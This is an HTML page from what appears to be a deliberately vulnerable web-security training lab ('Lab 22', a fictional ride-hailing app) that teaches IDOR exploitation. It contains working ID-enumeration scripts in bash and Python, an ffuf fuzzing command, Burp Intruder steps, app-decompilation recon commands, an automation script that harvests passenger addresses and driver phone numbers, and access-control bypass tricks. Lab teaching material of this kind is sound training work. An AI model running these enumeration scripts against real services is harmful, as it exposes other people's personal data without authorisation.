<?php require_once 'config.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploitation Techniques - Lab 22</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #164e63 100%);
            color: #e2e8f0;
            min-height: 100vh;
            line-height: 1.7;
        }
        .header {
            background: rgba(15, 23, 42, 0.9);
            border-bottom: 1px solid rgba(6, 182, 212, 0.3);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo { font-size: 1.5rem; font-weight: bold; color: #22d3ee; }
        .nav-links { display: flex; gap: 1rem; }
        .nav-links a {
            padding: 0.5rem 1rem;
            background: rgba(6, 182, 212, 0.1);
            border: 1px solid rgba(6, 182, 212, 0.3);
            color: #22d3ee;
            text-decoration: none;
            border-radius: 6px;
        }
        .container { max-width: 900px; margin: 0 auto; padding: 2rem; }
        h1 { color: #22d3ee; font-size: 2rem; margin-bottom: 0.5rem; }
        .subtitle { color: #64748b; margin-bottom: 2rem; }
        .card {
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(6, 182, 212, 0.3);
            border-radius: 16px;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .card h2 { color: #22d3ee; margin-bottom: 1rem; }
        .card h3 { color: #f59e0b; margin: 1.5rem 0 1rem; }
        .card p { color: #94a3b8; margin-bottom: 1rem; }
        .code-block {
            background: #0d1117;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        .code-block pre { color: #e2e8f0; font-family: monospace; font-size: 0.85rem; white-space: pre-wrap; }
        .tool-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(6, 182, 212, 0.2);
            border-radius: 12px;
            padding: 1.5rem;
            margin: 1rem 0;
        }
        .tool-card h4 { color: #22d3ee; margin-bottom: 0.75rem; }
        .tool-card p { color: #94a3b8; margin-bottom: 0.5rem; }
        .technique {
            background: rgba(245, 158, 11, 0.1);
            border-left: 4px solid #f59e0b;
            padding: 1.25rem;
            margin: 1rem 0;
            border-radius: 0 12px 12px 0;
        }
        .technique h4 { color: #f59e0b; margin-bottom: 0.5rem; }
        .btn {
            display: inline-block;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            margin: 0.25rem;
        }
        .btn-primary { background: linear-gradient(135deg, #06b6d4, #0891b2); color: white; }
        .btn-secondary { background: rgba(6, 182, 212, 0.1); border: 1px solid rgba(6, 182, 212, 0.3); color: #22d3ee; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">üöó RideKea</div>
        <nav class="nav-links">
            <a href="docs.php">‚Üê Docs</a>
            <a href="lab-description.php">üìñ Guide</a>
            <a href="login.php">üîë Login</a>
        </nav>
    </header>

    <div class="container">
        <h1>üß™ Exploitation Techniques</h1>
        <p class="subtitle">Methods to discover and exploit IDOR vulnerabilities</p>

        <div class="card">
            <h2>üîç ID Enumeration Strategies</h2>
            
            <div class="technique">
                <h4>1. Sequential Enumeration</h4>
                <p>When IDs are sequential (1, 2, 3...), simply increment/decrement to find other resources</p>
            </div>
            
            <div class="code-block">
<pre># Bash script for sequential enumeration
for id in $(seq 1000000 1000100); do
    curl -s "https://api.target.com/booking?id=$id" \
        -H "Authorization: Bearer $TOKEN" | jq '.data.name'
done</pre>
            </div>
            
            <div class="technique">
                <h4>2. Pattern-Based Enumeration</h4>
                <p>IDs like BKG_65f4e3d2c1b0 may follow predictable patterns (timestamp-based, hex sequential)</p>
            </div>
            
            <div class="code-block">
<pre># Python script for hex pattern enumeration
import requests
import itertools

base_id = "BKG_"
chars = "0123456789abcdef"

for combo in itertools.product(chars, repeat=12):
    booking_id = base_id + "".join(combo)
    resp = requests.get(f"{API_URL}?booking_id={booking_id}", 
                       headers={"Authorization": f"Bearer {TOKEN}"})
    if resp.status_code == 200:
        print(f"Found: {booking_id}")</pre>
            </div>
        </div>

        <div class="card">
            <h2>üõ†Ô∏è Tools for IDOR Testing</h2>
            
            <div class="tool-card">
                <h4>Burp Suite Intruder</h4>
                <p>Use Intruder to automate ID enumeration with payloads. Set up a sniper attack on the ID parameter.</p>
                <div class="code-block">
<pre>1. Capture request in Proxy
2. Send to Intruder (Ctrl+I)
3. Set position on booking_id value
4. Use Numbers payload: 1000000-1000100, step 1
5. Start attack and filter by response length</pre>
                </div>
            </div>
            
            <div class="tool-card">
                <h4>OWASP ZAP</h4>
                <p>Use the Fuzzer to test ID parameters. Supports scripts for custom enumeration logic.</p>
            </div>
            
            <div class="tool-card">
                <h4>Autorize (Burp Extension)</h4>
                <p>Automatically tests access control by replaying requests with different user sessions.</p>
            </div>
            
            <div class="tool-card">
                <h4>ffuf (Fast Web Fuzzer)</h4>
                <div class="code-block">
<pre>ffuf -u "http://target.com/api/bookings?booking_id=BKG_FUZZ" \
     -w booking_ids.txt \
     -H "Authorization: Bearer $TOKEN" \
     -mc 200 \
     -o results.json</pre>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>üéØ Discovery Techniques</h2>
            
            <h3>1. JavaScript Analysis</h3>
            <p>Search JavaScript files for API endpoints and ID parameters:</p>
            <div class="code-block">
<pre># Find API endpoints in JS files
grep -r "booking_id" *.js
grep -r "/api/" *.js
grep -r "fetch\|axios\|XMLHttpRequest" *.js</pre>
            </div>
            
            <h3>2. API Documentation</h3>
            <p>Check for exposed Swagger/OpenAPI docs at common paths:</p>
            <div class="code-block">
<pre>/swagger/
/api-docs/
/swagger.json
/openapi.json
/v1/docs
/api/swagger-ui/</pre>
            </div>
            
            <h3>3. Mobile App Analysis</h3>
            <p>Decompile APK/IPA to find hardcoded endpoints:</p>
            <div class="code-block">
<pre># Android APK analysis
apktool d app.apk
grep -r "api" app/smali/
jadx app.apk -d decompiled/

# iOS IPA analysis  
unzip app.ipa
strings Payload/App.app/App | grep -i "api"</pre>
            </div>
        </div>

        <div class="card">
            <h2>üîÑ Automation Script</h2>
            <p>Python script to automate IDOR testing for this lab:</p>
            
            <div class="code-block">
<pre>import requests

BASE_URL = "http://localhost/AC/lab22/api"
ATTACKER_SESSION = "your_session_cookie"

# Target booking IDs (victim's)
targets = [
    "BKG_65f4e3d2c1b0",
    "BKG_78a9b0c1d2e3", 
    "BKG_90c1d2e3f4g5"
]

headers = {"Cookie": f"PHPSESSID={ATTACKER_SESSION}"}

for booking_id in targets:
    # Test booking details endpoint
    r1 = requests.get(f"{BASE_URL}/bookings.php?booking_id={booking_id}", 
                      headers=headers)
    if r1.status_code == 200:
        data = r1.json()
        if data.get('success'):
            print(f"[IDOR] Accessed booking: {booking_id}")
            print(f"  Passenger: {data['data']['passenger']['name']}")
            print(f"  Address: {data['data']['pickup']['address']}")
    
    # Test bids endpoint
    r2 = requests.get(f"{BASE_URL}/bids.php?booking_id={booking_id}",
                      headers=headers)
    if r2.status_code == 200:
        data = r2.json()
        if data.get('success'):
            print(f"[IDOR] Found {data['data']['total_bids']} bids")
            for bid in data['data']['bids']:
                print(f"  Driver: {bid['driver']['name']} - {bid['driver']['phone']}")</pre>
            </div>
        </div>

        <div class="card">
            <h2>‚ö†Ô∏è Common Bypass Techniques</h2>
            
            <div class="technique">
                <h4>Parameter Pollution</h4>
                <p>Try adding duplicate parameters: <code>?id=own_id&id=victim_id</code></p>
            </div>
            
            <div class="technique">
                <h4>JSON Body Override</h4>
                <p>Send ID in both URL and JSON body - server may process one without auth check</p>
            </div>
            
            <div class="technique">
                <h4>HTTP Method Switching</h4>
                <p>If GET is protected, try POST, PUT, or even PATCH with same parameters</p>
            </div>
            
            <div class="technique">
                <h4>Encoding Variations</h4>
                <p>Try URL encoding, double encoding, or unicode variations of the ID</p>
            </div>
        </div>

        <div style="text-align: center; margin-top: 2rem;">
            <a href="docs-architecture.php" class="btn btn-primary">Next: Architecture Overview ‚Üí</a>
            <a href="docs-report.php" class="btn btn-secondary">‚Üê Previous</a>
        </div>
    </div>
</body>
</html>
